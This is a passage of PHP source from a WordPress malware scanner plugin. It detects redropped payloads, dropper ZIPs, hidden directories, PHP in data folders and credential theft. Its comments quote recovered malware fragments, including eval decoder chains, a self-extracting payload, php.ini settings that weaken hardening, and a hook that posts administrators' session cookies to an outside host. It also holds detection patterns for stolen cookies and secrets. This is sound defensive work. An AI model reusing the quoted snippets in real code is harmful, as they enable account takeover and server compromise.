			];

			// Update redrop counters in place; persisted at end of scan.
			$history[ $hash ]['redrop_count']     = (int) ( $history[ $hash ]['redrop_count'] ?? 0 ) + 1;
			$history[ $hash ]['last_redrop_at']   = time();
			$history[ $hash ]['last_redrop_path'] = $path;
			$matches_changed = true;

			WPS_Logger::log_event(
				'redrop_detected',
				'hash=' . substr( $hash, 0, 16 ) . '... path=' . $path
				. ' count=' . $history[ $hash ]['redrop_count']
				. ' family=' . $rec['family']
			);
			return true;
		};

		try {
			$iter = new RecursiveIteratorIterator(
				new RecursiveDirectoryIterator( WP_CONTENT_DIR, FilesystemIterator::SKIP_DOTS ),
				RecursiveIteratorIterator::LEAVES_ONLY
			);
			foreach ( $iter as $f ) {
				if ( ! ( $f instanceof SplFileInfo ) ) continue;
				if ( ! $scan_one( $f ) ) break;
			}
		} catch ( \Exception $e ) {}

		// 1.3.97: the doorway kit is confirmed to re-drop at the ABSPATH root, not
		// only under wp-content. Shallow-scan the web root's top level (no recursion
		// core dirs are covered elsewhere) so a root-level re-drop still trips the
		// tripwire and the RE-DROPPED Nx counter stays honest for the kit's
		// preferred location.
		if ( defined( 'ABSPATH' ) && is_dir( ABSPATH ) ) {
			try {
				foreach ( new DirectoryIterator( ABSPATH ) as $f ) {
					if ( $f->isDot() || ! $f->isFile() ) continue;
					if ( ! $scan_one( $f ) ) break;
				}
			} catch ( \Exception $e ) {}
		}

		if ( $matches_changed ) self::save_redrop_history( $history );

		return $found;
	}

	/** Load the redrop history option as an associative array keyed by hash. */
	private static function load_redrop_history(): array {
		$h = get_option( self::REDROP_OPTION, [] );
		return is_array( $h ) ? $h : [];
	}

	/** Persist the redrop history with FIFO eviction at REDROP_MAX_RECORDS. */
	private static function save_redrop_history( array $history ): void {
		if ( count( $history ) > self::REDROP_MAX_RECORDS ) {
			uasort( $history, fn( $a, $b ) => ( $a['deleted_at'] ?? 0 ) <=> ( $b['deleted_at'] ?? 0 ) );
			$history = array_slice( $history, -self::REDROP_MAX_RECORDS, null, true );
		}
		update_option( self::REDROP_OPTION, $history, 'no' );
	}

	/** Drop history records older than REDROP_TTL_SECONDS from the option. */
	private static function prune_redrop_history(): void {
		$history = self::load_redrop_history();
		if ( empty( $history ) ) return;
		$threshold = time() - self::REDROP_TTL_SECONDS;
		$changed = false;
		foreach ( $history as $hash => $rec ) {
			if ( ( $rec['deleted_at'] ?? 0 ) < $threshold ) {
				unset( $history[ $hash ] );
				$changed = true;
			}
		}
		if ( $changed ) self::save_redrop_history( $history );
	}

	//  Dropper cache hunt (1.3.43) 
	//
	// The .sbs toolkit and the ClickFix RAT family both demonstrate the same
	// persistence pattern: the operator parks a toolkit ZIP somewhere in
	// wp-content/, and a dropper extracts the component files from that
	// cached ZIP on every cycle. Removing only the dropped files leaves the
	// cached ZIP intact, so the next cycle reproduces the toolkit byte-for-
	// byte. The redrop detector (1.3.42) catches each cycle, but it does
	// not address the source.
	//
	// This check sweeps wp-content/ for three things:
	//
	//   1. ZIP files whose basename contains a confirmed dropper-cache
	//      substring (currently `wp-config-cache`). These have no benign
	//      explanation; auto-delete safe.
	//
	//   2. Loose dropper component PHP files anywhere under wp-content/,
	//      matched against `WPS_Indicators::secondary_backdoor_filenames()`.
	//      The existing scanner walkers already cover specific directories
	//      (uploads, cache, mu-plugins, languages, ABSPATH root); this catches
	//      the case where the operator parks a copy in an unexpected nested
	//      directory like `wp-content/some-vendor-cache/`.
	//
	//   3. Hidden directories anywhere under wp-content/. WordPress and
	//      well-behaved plugins do not place leading-dot directories under
	//      wp-content/; .well-known belongs at the web root, not here.
	//      Severity is medium (review only) because false positives are
	//      possible if a developer has manually placed a .git checkout under
	//      wp-content/ during local development.
	//
	// Bounds: depth 6 walker, 5000-file cap, plugin's own directory excluded.

	const DROPPER_CACHE_MAX_FILES = 5000;
	const DROPPER_CACHE_MAX_DEPTH = 6;

	/**
	 * Walk wp-content/ for cached dropper toolkits and loose backdoor files.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_dropper_cache(): array {
		$found = [];
		if ( ! is_dir( WP_CONTENT_DIR ) ) return $found;

		$zip_patterns        = WPS_Indicators::dropper_cache_zip_patterns();
		$backdoor_filenames  = WPS_Indicators::secondary_backdoor_filenames();
		$backdoor_lookup     = array_fill_keys( array_map( 'strtolower', $backdoor_filenames ), true );
		$self_dir            = realpath( WPS_DIR ) ?: '';
		$content_dir         = realpath( WP_CONTENT_DIR ) ?: WP_CONTENT_DIR;

		// Hidden-directory false-positive suppression. .well-known is not a
		// concern under wp-content/ (it belongs at web root) but a developer
		// might keep a local .git checkout. Keep this list narrow.
		$hidden_dir_safe = [ '.gitkeep', '.htaccess' ]; // .htaccess is a file, listed defensively

		$count = 0;
		try {
			$iter = new RecursiveIteratorIterator(
				new RecursiveDirectoryIterator( $content_dir, FilesystemIterator::SKIP_DOTS ),
				RecursiveIteratorIterator::SELF_FIRST
			);
			$iter->setMaxDepth( self::DROPPER_CACHE_MAX_DEPTH );

			foreach ( $iter as $f ) {
				if ( ++$count > self::DROPPER_CACHE_MAX_FILES ) break;
				if ( ! ( $f instanceof SplFileInfo ) ) continue;

				$path = $f->getPathname();
				$real = realpath( $path );
				if ( $self_dir !== '' && $real && ( $real === $self_dir || WPS_Utils::path_is_inside( $real, WPS_DIR ) ) ) continue;
				if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $path ) ) continue; // 1.3.94: never re-scan the store

				$basename = $f->getFilename();
				$basename_lower = strtolower( $basename );

				// Hunt 1: ZIP container with dropper-cache substring
				if ( $f->isFile() && strtolower( $f->getExtension() ) === 'zip' ) {
					foreach ( $zip_patterns as $pat ) {
						if ( stripos( $basename, $pat ) !== false ) {
							$found[] = [
								'severity'    => 'critical',
								'type'        => 'Dropper-cache ZIP container (matches ' . $pat . ')',
								'subject'     => $basename,
								'path'        => $path,
								'action'      => 'Delete this cached toolkit ZIP; the dropper extracts the redroped files from it on every cycle. rm ' . $path,
								'auto_delete' => true,
								'delete_path' => $path,
							];
							break;
						}
					}
					continue; // ZIPs need no further matching
				}

				// Hunt 2: loose dropper component file anywhere under wp-content/
				if ( $f->isFile() && isset( $backdoor_lookup[ $basename_lower ] ) ) {
					$found[] = [
						'severity'    => 'critical',
						'type'        => 'Loose dropper component (' . $basename . ')',
						'subject'     => $basename . ' at ' . str_replace( $content_dir, 'wp-content', $path ),
						'path'        => $path,
						'action'      => 'Delete this backdoor file; it is one of the toolkit components the dropper has parked outside the standard hideouts. rm ' . $path,
						'auto_delete' => true,
						'delete_path' => $path,
					];
					continue;
				}

				// Hunt 3: hidden directory under wp-content/
				if ( $f->isDir() && $basename !== '' && $basename[0] === '.' && ! in_array( $basename_lower, $hidden_dir_safe, true ) ) {
					// 1.3.50: false-positive suppression for two well-known cases.
					//
					// (a) Composer-vendored packages routinely ship `.github/`,
					//     `.circleci/`, `.gitlab/` directories containing CI
					//     configuration. These are part of the legitimate library
					//     distribution; thousands of WordPress plugins include them.
					//     Flagging them as suspicious produces nothing but noise.
					//     Skip when the path includes `/vendor/` AND the basename
					//     matches a known CI/dev-artifact directory.
					//
					// (b) The wp-file-manager plugin's runtime `.trash/` directory
					//     is part of the plugin's own functional design (user
					//     trash for the file manager UI). The plugin itself is
					//     separately flagged as a high-risk plugin via
					//     `check_high_risk_plugins`, so finding `.trash` inside
					//     it is double-counted noise that distracts from the
					//     real finding.
					$path_lower = strtolower( $path );
					$is_vendor_path = strpos( $path_lower, '/vendor/' ) !== false || strpos( $path_lower, '\\vendor\\' ) !== false;
					$vendor_safe_dirs = [ '.github', '.circleci', '.gitlab', '.gitea', '.docker', '.husky', '.ddev' ];
					if ( $is_vendor_path && in_array( $basename_lower, $vendor_safe_dirs, true ) ) {
						continue; // Composer-vendored CI config, not malware
					}
					// wp-file-manager plugin's own runtime directory
					if ( $basename_lower === '.trash' && ( strpos( $path_lower, '/wp-file-manager/' ) !== false || strpos( $path_lower, '\\wp-file-manager\\' ) !== false ) ) {
						continue; // plugin's own functional dir; the plugin is flagged separately
					}

					// Skip .git, .svn, .idea, .vscode if a developer placed them
					// here intentionally; medium severity, review-only.
					$known_dev_dirs = [ '.git', '.svn', '.hg', '.idea', '.vscode', '.cache' ];
					// 1.3.61: populate `delete_path` only when the candidate
					// directory is contained within WP_PLUGIN_DIR. The Overview
					// UI exposes a one-click "Delete this path" button when this
					// field is set; gating on the plugin-folder boundary keeps
					// the button-driven deletion inside the WPSEC-001 (1.3.57)
					// containment narrowing. Files at ABSPATH root or outside
					// WP_PLUGIN_DIR remain instruction-only and do not get a
					// button  the operator must confirm those manually because
					// the safety implications are higher.
					$plugin_dir_real = realpath( defined( 'WP_PLUGIN_DIR' ) ? WP_PLUGIN_DIR : ( WP_CONTENT_DIR . '/plugins' ) );
					$path_real       = realpath( $path );
					$inside_plugins  = $plugin_dir_real && $path_real && WPS_Utils::path_is_inside( $path_real, $plugin_dir_real );
					$delete_path     = $inside_plugins ? $path : '';

					if ( in_array( $basename_lower, $known_dev_dirs, true ) ) {
						$found[] = [
							'severity'    => 'medium',
							'type'        => 'Hidden development directory under wp-content/',
							'subject'     => str_replace( $content_dir, 'wp-content', $path ),
							'path'        => $path,
							'action'      => 'Development directories should not be deployed to production wp-content/. Move out of the web root or remove if the deploy was unintentional.',
							'delete_path' => $delete_path,
						];
					} else {
						$found[] = [
							'severity'    => 'high',
							'type'        => 'Hidden directory under wp-content/ (no benign explanation)',
							'subject'     => str_replace( $content_dir, 'wp-content', $path ),
							'path'        => $path,
							'action'      => 'WordPress and well-behaved plugins do not place leading-dot directories under wp-content/. Inspect the contents and remove if the path is not yours.',
							'delete_path' => $delete_path,
						];
					}
				}
			}
		} catch ( \Exception $e ) {
			WPS_Logger::write( 'check_dropper_cache walker error: ' . $e->getMessage() );
		}

		return $found;
	}

	//  .well-known PHP hunt (1.3.44) 
	//
	// The wp-locale-handler RAT v1.7 was caught hidden in
	// .well-known/pki-validation/cert-check.php  a deliberately legitimate-
	// looking path. The IETF .well-known/ directory (RFC 8615) is a real
	// standard for SSL/TLS certificate validation, ACME challenges,
	// security.txt, host-meta, OpenID configuration, and similar. Most
	// security plugins exclude .well-known/ from scanning to avoid breaking
	// ACME challenges; the operator hides in plain sight there.
	//
	// The protocol design of every standard .well-known/ URI uses static
	// content: .txt for ACME challenges and PKI validation, .json for
	// openid-configuration / apple-app-site-association / assetlinks /
	// microsoft-identity-association, plain text for host-meta, .well-known/
	// security.txt is a single text file. PHP execution under .well-known/
	// is virtually never legitimate. The rare exception is hosting-panel-
	// managed PHP for ACME (some Plesk configurations), which is the reason
	// unsigned PHP files are flagged at `high` severity for review rather
	// than auto-deleted.

	const WELL_KNOWN_MAX_FILES = 500;
	const WELL_KNOWN_MAX_DEPTH = 6;

	/**
	 * Walk <ABSPATH>/.well-known/ for PHP files. Any PHP file there is
	 * suspicious because the IETF protocols using .well-known are all
	 * text-based. Files matching a known RAT signature are auto-deleted;
	 * unsigned PHP files are review-only.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	/**
	 * 1.4.25: doorway cloaking - a page that shows one thing to search engines
	 * and another to the site's owner.
	 *
	 * Recovered from a live infection: a root index.php that tested the user
	 * agent against a list of crawlers and the referrer against Japanese
	 * search engines, served spam product pages to whichever matched, and the
	 * real site to everyone else. The owner could not see it by design, and
	 * the damage lands in search results rather than on the page.
	 *
	 * Matched after unescaping, because the sample wrote every one of those
	 * strings in hex specifically to defeat a scanner reading raw bytes.
	 *
	 * Two independent signals are required. A crawler list alone is what any
	 * legitimate bot-detection or caching plugin does; paired with a
	 * search-referrer test or with log suppression, it is cloaking.
	 */
	/**
	 * 1.4.33: an unauthenticated file manager - the plain-text web shell.
	 *
	 * Every content detector in this scanner before now looked for hiding:
	 * hex escapes, base64, control-flow flattening. A live sample recovered
	 * from an infected site scored zero on all of them, because it was not
	 * hiding at all. It was a hundred and fifty lines of clean, readable PHP
	 * that uploaded, edited, renamed and deleted any file on the server, and
	 * listed any directory, with no password and no WordPress at all.
	 *
	 * It did not need to hide, because nothing was looking for code that
	 * simply asks to be run. Obfuscation is a tactic, not a definition, and a
	 * scanner that only knows how to spot concealment will miss the shells
	 * that never bothered.
	 *
	 * The technique this matches is the thing itself rather than its disguise:
	 * a file that does not load WordPress, checks no capability, nonce,
	 * password or session, and yet performs several different filesystem
	 * mutations driven by request input. There is no benign version of that
	 * combination - at best it is a plugin author's utility script that
	 * anyone on the internet can use to overwrite files, which needs removing
	 * just as urgently as a shell does.
	 */
	/**
	 * 1.4.34: a PHP payload hidden behind a chain of decoders.
	 *
	 * The pattern, from a live sample:
	 *
	 *     $a = 'base'.'64'.'_'.'decode';  $b = 'gzinflat'.'e';
	 *     $c = 'st'.'r'.'_rot'.'13';      $d = 's'.'trrev';
	 *     eval( $d( $c( $b( $a( '<twenty kilobytes of base64>' ) ) ) ) );
	 *
	 * Two evasions at once. The decoder names are split across concatenation
	 * so a grep for `base64_decode` finds nothing, and they are then called
	 * through variables so a search for `base64_decode(` finds nothing either.
	 * The existing loader check does not help: it was written for JavaScript
	 * and wants atob, charCodeAt and TextDecoder together.
	 *
	 * Matching is done after `deobfuscate_literals()`, which rejoins the split
	 * names, and on the NAME rather than on a call - because the whole point
	 * of the technique is that the name is never adjacent to its bracket.
	 *
	 * Requiring an execution sink, two or more decoders and a substantial
	 * encoded literal together is what keeps this quiet: a minifier or a
	 * legitimate cache file may have one of those, never all three.
	 */
	/**
	 * 1.4.34: configuration files dropped to weaken the server.
	 *
	 * Everything this scanner reads is PHP. A kit recovered from a live site
	 * was a third configuration: six identical php.ini files and seven
	 * .htaccess files, sitting beside the shells and completely unexamined,
	 * because they are not code and nothing was looking at them.
	 *
	 * The php.ini read:
	 *
	 *     safe_mode = Off        disable_functions = NONE
	 *     open_basedir = OFF     exec = ON      shell_exec = ON
	 *
	 * On CGI and FastCGI a per-directory php.ini is honoured, so that file
	 * re-enables the exact functions a host disables to contain a break-in,
	 * and removes the directory jail meant to keep one contained. It is not a
	 * payload; it is the thing that makes the next payload work.
	 *
	 * The .htaccess files re-allow direct access to php and shell scripts in
	 * directories where a host had denied it.
	 *
	 * Only files this plugin's own directory does not own are examined, and
	 * only settings with no legitimate reason to be relaxed are matched.
	 */
	/**
	 * 1.4.35: names deliberately hidden from a search.
	 *
	 * The sharpest signal in the samples recovered so far, and the simplest.
	 * A plugin calling itself "Native Image Optimizer" - correct header,
	 * ABSPATH guard, uninstall routine, licence, translation template - was
	 * invisible to every check here. It had no eval, no goto, no encoded
	 * blob in any PHP file, and did not touch the filesystem. Its payload sat
	 * in resources/config.bin behind a custom container, so a scanner reading
	 * only PHP had nothing to read.
	 *
	 * What it could not hide was the shape of its own evasion. Every
	 * meaningful identifier was split across string concatenation:
	 *
	 *     'HTTP'.'_USER_A'.'GENT'      'wp'.'_foo'.'ter'
	 *     'g'.'oogl'.'ebot'            'cr'.'aw'.'l'
	 *
	 * Rejoining those - which deobfuscate_literals() already does - reveals
	 * thirteen sensitive names that a plain search of the file finds nowhere.
	 *
	 * That gap IS the finding. There is no reason to write a function name in
	 * pieces except to defeat the search someone will run for it, and the
	 * measurement is unambiguous: thirteen hidden names in the sample, and
	 * zero across seventy-nine files of real theme and plugin code.
	 *
	 * The names it hides also say what it does. A file concealing googlebot,
	 * crawl, spider and lighthouse alongside is_user_logged_in and
	 * administrator is choosing an audience, and the audience it is avoiding
	 * is search engines and whoever owns the site.
	 */
	/**
	 * 1.4.36: obfuscated JavaScript carried inside a PHP file.
	 *
	 * A sample styled as "simple js plugin" - correct header, ABSPATH guard,
	 * one file - produced nothing against any check here. Its PHP was clean
	 * and readable throughout. What it carried was a heredoc holding a single
	 * line of a hundred and eleven thousand bytes of obfuscated JavaScript,
	 * printed into wp_footer.
	 *
	 * Nothing was looking, because every content check reasons about PHP. The
	 * PHP in this file is not the malware; it is the envelope.
	 *
	 * The signal is the naming that javascript-obfuscator leaves behind. It
	 * renames every identifier to a hexadecimal token - _0x4f78, _0x54f1d9 -
	 * and there were four thousand nine hundred of them here, against zero
	 * across eighty-three files of real theme and plugin code, a legitimate
	 * eighty-kilobyte minified bundle among them.
	 *
	 * Line length was considered as a signal and rejected: that same minified
	 * bundle is one line of eighty thousand bytes, and minification is not
	 * obfuscation. Renaming everything to hex is.
	 */
	/**
	 * 1.4.37: a file that reads itself and executes what follows its own
	 * closing tag.
	 *
	 * The mechanism, from a recovered sample:
	 *
	 *     $p = explode( base64_decode( 'Pz4=' ), file_get_contents( __FILE__ ) );
	 *     ... base64_decode( strrev( str_rot13( $p[1] ) ) ) ...
	 *     preg_replace( $a, serialize( @eval( $payload ) ), $b ); exit();
	 *     ?>==Dstfmoz5...sixteen kilobytes of encoded data...
	 *
	 * `Pz4=` is `?>`. The file splits itself on its own closing tag and runs
	 * whatever comes after it. The payload is therefore not in a string
	 * literal, not in any variable, and not even inside the PHP block - which
	 * is why the decoder-chain check found nothing to match.
	 *
	 * Detection is the combination rather than any part: a file reading its
	 * own path, an execution sink, and a substantial body of data past the
	 * closing tag. Each alone is innocent; together they are a self-extracting
	 * payload.
	 *
	 * IMPORTANT, and the reason this is rated high rather than critical:
	 * commercial security and licensing products use this same technique to
	 * stop their own code being read. A recovered sample carried a Monarx
	 * copyright header. The finding therefore names the possibility, looks for
	 * a vendor string, and tells the operator to confirm with their host
	 * before deleting anything - because a scanner that removes the host's
	 * own security agent has done more harm than the thing it was hunting.
	 */
	/**
	 * 1.4.39: identifiers spelled out of another string, one character at a
	 * time.
	 *
	 * The most careful evasion recovered so far. From a live sample:
	 *
	 *     $y = 'I could not have a more welcome visitor 64 group of zain bani';
	 *     $f = $y[15] . $y[14] . $y[13] . $y[5] . '(' . $y[43] . $y[52] . ...
	 *     eval( $f . 'eJyt/EnPrFxitQmPban...' );
	 *
	 * The sentence is innocuous and the function names never exist as text:
	 * `gzuncompress` and `base64_decode` are assembled character by character
	 * from indices into it, then the whole call is built as a string and run.
	 *
	 * Every check written before this one is blind to it, and each for a
	 * different reason. Nothing is split across concatenation, so rejoining
	 * literals finds nothing to rejoin and the hidden-identifier check sees no
	 * change. No decoder name appears anywhere, so the decoder-chain check
	 * counts zero. The goto density is seven, well under the flattening floor.
	 * The payload is concatenated onto a built string rather than sitting in a
	 * literal, so there is no encoded blob to match.
	 *
	 * What it cannot avoid is the construction itself. Spelling a name out of
	 * a haystack takes one indexing expression per character, and they must be
	 * concatenated in order. Twenty-eight such chains in the sample; the worst
	 * case across a production theme and this plugin is three, which appear in
	 * ordinary string handling.
	 */
	/**
	 * 1.4.40: executable PHP in a directory that holds data.
	 *
	 * Every check before this one asks what a file contains. None asks where
	 * it is, and location is evidence in its own right - often the strongest
	 * available, because it needs no interpretation.
	 *
	 * A backdoor recovered from a live site sat in wp-content/fonts/. It is
	 * gated behind a secret token, so it returns nothing at all to anyone who
	 * does not already know it, and on content alone it rated only "high". But
	 * a PHP file in the fonts directory is wrong before it is read.
	 *
	 * Two tiers, because the distinction matters. In uploads, fonts and the
	 * upgrade scratch directory, nothing legitimate installs code and the
	 * location alone is the finding. In caches, logs and backups, plugins do
	 * write .php files, so something about the file must also be wrong.
	 *
	 * Files that are inert by construction are excluded outright. Wordfence
	 * stores its logs as `<?php exit('Access denied'); __halt_compiler(); ?>`
	 * followed by data - the extension stops anyone reading the file directly
	 * while nothing in it ever runs. That is the correct way to hold data in a
	 * web-reachable directory, and an earlier draft of this check reported it
	 * as malware. Reporting a security plugin as an intrusion is the kind of
	 * false positive that teaches an operator to ignore the scanner.
	 */
	/**
	 * 1.4.41: credentials or session cookies sent to a hardcoded host.
	 *
	 * Every check in this scanner reasons about how code hides, or what it
	 * writes to disk. None asks what leaves the site. A file recovered from a
	 * live installation exposed that gap completely:
	 *
	 *     register_shutdown_function( function () {
	 *         $u = wp_get_current_user();
	 *         if ( ! in_array( 'administrator', (array) $u->roles ) ) return;
	 *         foreach ( $_COOKIE as $n => $v )
	 *             if ( strpos( $n, 'wordpress_' ) === 0 ) $c[] = "$n=$v";
	 *         @wp_remote_post( 'https://webanalytics-cdn.sbs/k', [ ... ] );
	 *     } );
	 *
	 * It is short, readable, unobfuscated PHP with a correct ABSPATH guard,
	 * in a directory where PHP belongs, writing nothing to disk. Every content
	 * check passed it, and each was right to by its own rules.
	 *
	 * What it does is wait for an administrator to log in and post that
	 * administrator's session cookies to somebody else - which is complete
	 * account takeover without a password, and invisible to a login guard
	 * because no login ever fails.
	 *
	 * The rule is narrow on purpose. Sending data to a hardcoded host is
	 * ordinary; plugins call their own APIs constantly. Sending SESSION
	 * COOKIES or CREDENTIALS to one is not ordinary, and there is no version
	 * of it that is legitimate.
	 */
	/**
	 * 1.4.42: collapse findings that are the same file in different places.
	 *
	 * A re-drop kit plants one payload in a dozen directories under randomly
	 * generated names, on the reasoning that whoever finds one will delete it
	 * and stop looking. Reporting that honestly produces a dozen separate
	 * criticals, identical but for a path - which buries every other finding
	 * on the screen and still does not say the thing that matters, which is
	 * that these are one intrusion and removing one achieves nothing.
	 *
	 * Grouping is by content rather than by name, because the names are the
	 * part the attacker regenerates. Two files with the same hash flagged by
	 * the same check are one finding with several locations.
	 *
	 * Three things are deliberately left alone. A file flagged by two
	 * different checks stays as two findings, because they say different
	 * things about it. A finding with no path is never grouped. And a file
	 * that has since disappeared passes through untouched rather than being
	 * silently dropped, since a scan result that quietly loses findings is
	 * worse than one that repeats them.
	 *
	 * @param array<int, array<string, mixed>> $findings
	 * @return array<int, array<string, mixed>>
	 */
	private static function group_duplicate_findings( array $findings ): array {
		if ( count( $findings ) < 2 ) {
			return $findings;
		}

		$buckets = [];
		$passed  = [];

		foreach ( $findings as $f ) {
			$path = (string) ( $f['path'] ?? '' );
			if ( '' === $path || ! @is_file( $path ) ) {
				$passed[] = $f;
				continue;
			}
			$hash = @md5_file( $path );
			if ( false === $hash ) {
				$passed[] = $f;
				continue;
			}
			// Type as well as hash: one file caught by two checks is two facts.
			$key = md5( (string) ( $f['type'] ?? '' ) ) . ':' . $hash;
			$buckets[ $key ][] = $f;
		}

		$out = [];
		foreach ( $buckets as $group ) {
			if ( count( $group ) < 2 ) {
				$out[] = $group[0];
				continue;
			}

			$first = $group[0];
			$paths = [];
			foreach ( $group as $g ) {
				$paths[] = self::display_path( (string) $g['path'] );
			}
			sort( $paths );
			$n = count( $paths );

			// The worst severity in the group governs the group.
			$rank  = [ 'critical' => 4, 'high' => 3, 'medium' => 2, 'warning' => 2, 'low' => 1, 'info' => 0 ];
			$worst = $first['severity'] ?? 'high';
			foreach ( $group as $g ) {
				if ( ( $rank[ $g['severity'] ?? '' ] ?? 0 ) > ( $rank[ $worst ] ?? 0 ) ) {
					$worst = $g['severity'];
				}
			}

			$shown  = array_slice( $paths, 0, 12 );
			$more   = $n - count( $shown );
			$list   = implode( ', ', $shown ) . ( $more > 0 ? ', and ' . $more . ' more' : '' );

			$first['severity'] = $worst;
			$first['subject']  = $n . ' identical copies: ' . $shown[0] . ( $n > 1 ? ' and ' . ( $n - 1 ) . ' other location(s)' : '' );
			$first['paths']    = $paths;
			$first['action']   = 'This same file is present in ' . $n . ' places: ' . $list . '. '
				. 'They are byte-for-byte identical, so this is one intrusion rather than ' . $n . ' - the copies exist '
				. 'precisely so that finding and deleting one changes nothing. Remove all of them together, and treat the '
				. 'count as a measure of how thoroughly the site was reached rather than of how many separate problems '
				. 'there are. ' . ( (string) ( $first['action'] ?? '' ) );

			$out[] = $first;
		}

		return array_merge( $out, $passed );
	}

	private static function check_credential_exfiltration(): array {
		$found    = [];
		$self_dir = realpath( WPS_DIR ) ?: '';

		$rx_out  = '/wp_remote_(?:post|get|request)\s*\(|curl_exec\s*\(|fsockopen\s*\(|file_get_contents\s*\(\s*[\'"]https?:/i';
		$rx_host = '/[\'"]https?:\/\/([a-z0-9.-]+)/i';

		// Only things that are never legitimately transmitted.
		$sensitive = [
			'/foreach\s*\(\s*\$_COOKIE\b/i'                 => 'every cookie the visitor holds',
			'/wordpress_logged_in|wordpress_sec_/i'            => 'WordPress session cookies',
			'/\$_COOKIE\s*\[\s*[\'"]wordpress/i'             => 'WordPress session cookies',
			'/\$_POST\s*\[\s*[\'"](?:pwd|password|pass|log|user_login)[\'"]/i' => 'submitted login credentials',
			'/user_pass\b/i'                                  => 'stored password hashes',
			'/AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|DB_PASSWORD/i' => 'the site\'s secret keys',
		];

		// Hosts WordPress and common tooling legitimately talk to. A match
		// here still needs sensitive data present, so this is belt and braces.
		$known = [ 'api.wordpress.org', 'downloads.wordpress.org', 'wordpress.org', 'rest.akismet.com', 'akismet.com', 'gravatar.com', 'secure.gravatar.com', 'ps.w.org' ];

		$roots = [ rtrim( ABSPATH, '/\\' ) ];
		if ( defined( 'WP_CONTENT_DIR' ) && is_dir( WP_CONTENT_DIR ) ) {
			$roots[] = rtrim( WP_CONTENT_DIR, '/\\' );
		}

		$count = 0;
		$seen  = [];
		foreach ( $roots as $root ) {
			if ( ! is_dir( $root ) ) {
				continue;
			}
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				$iter->setMaxDepth( 6 );
				foreach ( $iter as $f ) {
					if ( self::out_of_time() ) {
						break 2;
					}
					if ( ++$count > 8000 || self::scan_budget_exceeded() ) {
						break 2;
					}
					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() || ! self::is_php_executable( $f ) ) {
						continue;
					}
					$path = $f->getPathname();
					$real = realpath( $path ) ?: $path;
					if ( isset( $seen[ $real ] ) ) {
						continue;
					}
					$seen[ $real ] = true;
					if ( '' !== $self_dir && strpos( $real, $self_dir ) === 0 ) {
						continue;
					}
					if ( $f->getSize() > 1048576 ) {
						continue;
					}
					$raw = @file_get_contents( $path );
					if ( false === $raw || ! class_exists( 'WPS_Utils' ) ) {
						continue;
					}
					$c = WPS_Utils::normalised( $path, $raw );

					if ( ! preg_match( $rx_out, $c ) ) {
						continue;
					}
					if ( ! preg_match( $rx_host, $c, $hm ) ) {
						continue;
					}
					$host = strtolower( $hm[1] );

					$what = [];
					foreach ( $sensitive as $rx => $desc ) {
						if ( preg_match( $rx, $c ) ) {
							$what[ $desc ] = true;
						}
					}
					if ( empty( $what ) ) {
						continue;
					}

					$trusted = in_array( $host, $known, true );
					$quiet   = (bool) preg_match( '/[\'"]blocking[\'"]\s*=>\s*(?:false|0)/i', $c );
					$defer   = (bool) preg_match( '/register_shutdown_function|wp_schedule_single_event/i', $c );

					$found[] = [
						// 1.4.43: eligible for the quarantine-first remediator.
						// This is about as content-confirmed as a finding gets -
						// an outbound call to a hardcoded host carrying session
						// cookies - and it is the one class of malware where
						// leaving the file in place while the operator decides
						// costs them another stolen session on the next login.
						// Only when the destination is NOT a host WordPress
						// itself uses, so a false positive on a vendor API can
						// never trigger removal.
						'auto_delete'  => ! $trusted,
						'delete_path'  => $trusted ? '' : $path,
						'severity' => $trusted ? 'high' : 'critical',
						'type'     => 'Credentials or session cookies sent off-site',
						'subject'  => self::display_path( $path ) . ' [' . $host . ']',
						'path'     => $path,
						'action'   => 'This file sends ' . implode( ' and ', array_keys( $what ) ) . ' to ' . $host . '. '
							. 'Transmitting session cookies is not a diagnostic or an analytic: whoever receives them can '
							. 'replay them and be signed in as that user, with no password and no failed login for any '
							. 'security plugin to notice.'
							. ( $defer ? ' It runs at the end of a request rather than during it, so nothing about the page appears different.' : '' )
							. ( $quiet ? ' The request is sent without waiting for a reply, so it costs no visible delay.' : '' )
							. ( $trusted ? ' The destination is a host WordPress itself uses, so confirm what is actually being sent before acting - but no legitimate component sends session cookies anywhere.' : '' )
							. ' If this is on your site, treat every administrator session as compromised: remove the file, '
							. 'then change the authentication salts in wp-config.php, which is what actually invalidates the '
							. 'sessions already taken. Deleting the file alone does not.',
					];
				}
			} catch ( \Throwable $t ) {
				continue;
			}
		}

		return $found;
	}

	private static function check_php_in_data_directory(): array {
		$found    = [];
		$self_dir = realpath( WPS_DIR ) ?: '';

		if ( ! defined( 'WP_CONTENT_DIR' ) || ! is_dir( WP_CONTENT_DIR ) ) {
			return $found;
		}
		$content = rtrim( WP_CONTENT_DIR, '/\\' );

		$strict = [
			'uploads' => 'the media library',
			'fonts'   => 'font files',
			'upgrade' => 'scratch space used during updates',
		];
		$loose = [
			'cache'   => 'generated page and object caches',
			'wflogs'  => 'a security plugin\'s logs',
			'logs'    => 'logs',
			'tmp'     => 'temporary files',
			'backup'  => 'backups',
			'backups' => 'backups',
		];

		foreach ( array_merge( $strict, $loose ) as $dir => $holds ) {
			$base = $content . '/' . $dir;
			if ( ! is_dir( $base ) ) {
				continue;
			}
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $base, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				$iter->setMaxDepth( 6 );
				$count = 0;
				foreach ( $iter as $f ) {
					if ( self::out_of_time() ) {
						break 2;
					}
					if ( ++$count > 20000 || self::scan_budget_exceeded() ) {
						break;
					}
					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() || ! self::is_php_executable( $f ) ) {
						continue;
					}
					$path = $f->getPathname();
					$real = realpath( $path ) ?: $path;
					if ( '' !== $self_dir && strpos( $real, $self_dir ) === 0 ) {
						continue;
					}

					$size = $f->getSize();
					$c    = (string) @file_get_contents( $path );

					// WordPress's own silence stubs.
					if ( $size <= 60 ) {
						$body = trim( $c );
						if ( '' === $body || preg_match( '/^<\?php\s*(?:\/\/|#|\/\*).{0,60}$/s', $body ) ) {
							continue;
						}
					}

